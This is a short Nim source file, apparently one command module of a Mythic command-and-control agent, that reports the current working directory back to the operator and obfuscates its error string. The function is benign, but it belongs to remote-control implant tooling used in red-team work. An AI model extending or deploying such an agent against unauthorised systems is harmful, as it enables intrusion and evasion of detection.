import std/[json, os, strformat]
import ../utils/m_responses
import ../utils/debug
import ../utils/strenc

proc pwd*(taskId: string, params: JsonNode): JsonNode =
  ## Print working directory
  try:
    let currentDir = getCurrentDir()
    
    debug "[DEBUG] Current directory: ", currentDir
    
    return mythicSuccess(taskId, currentDir)
    
  except Exception as e:
    return mythicError(taskId, obf("Failed to get current directory: ") & e.msg)
